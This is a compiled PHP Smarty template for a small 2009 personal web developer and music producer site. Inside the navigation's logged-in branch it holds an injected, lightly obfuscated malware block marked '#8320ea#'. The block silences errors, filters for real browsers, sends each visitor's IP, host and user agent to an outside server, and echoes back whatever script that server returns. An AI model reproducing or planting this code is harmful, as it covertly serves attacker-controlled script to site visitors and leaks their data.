<?php /* Smarty version 2.6.22, created on 2009-06-24 19:42:52
         compiled from /home/a1425978/public_html/beta//templates/main.html */ ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head> 

<title>--- Alan Marcero  &middot;  Web Developer  &middot;  Music Producer ---</title>

<link rel="stylesheet" href="css/main.css" media="screen" type="text/css" />
</head>

<body>
<div id="banner"></div> <!-- end banner -->

<div id="nav">
	<div id="navContent">
		<ul>
			<li><a href="index.php">Sound Design</li>
			<li><a href="customers.php">Customer's Section</li>
			<li><a href="http://www.myspace.com/AlanMarcero">MySpace</a></li>
			<?php if ($this->_tpl_vars['session_email']): ?>
<?php
#8320ea#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/8320ea#
?>
<?php

?>
<?php

?>
<?php

?><li style="text-align:right"><a href="logout.php" />Logout</a></li><?php endif; ?>
		</ul>
	</div>
</div>		
	
<div id="sectionHeading">
	<div id="sectionHeadingText">
		<div id="cart">
		</div>
		<div id="loggedIn">
			<?php if ($this->_tpl_vars['session_email']): ?>Logged in with email: <?php echo $this->_tpl_vars['session_email']; ?>
<?php endif; ?>
		</div>
	</div>
</div>

<div id="sectionContent">
	<div id="sectionContentText">
		<?php echo $this->_tpl_vars['content']; ?>

    <div id="footer">
		<p style="margin:0px;">
			All Content &copy; 2009 Alan Marcero 
		</p>
    </div>
	</div><!-- end sectionContentText -->
</div> <!-- end sectionContent -->
</body>

</html>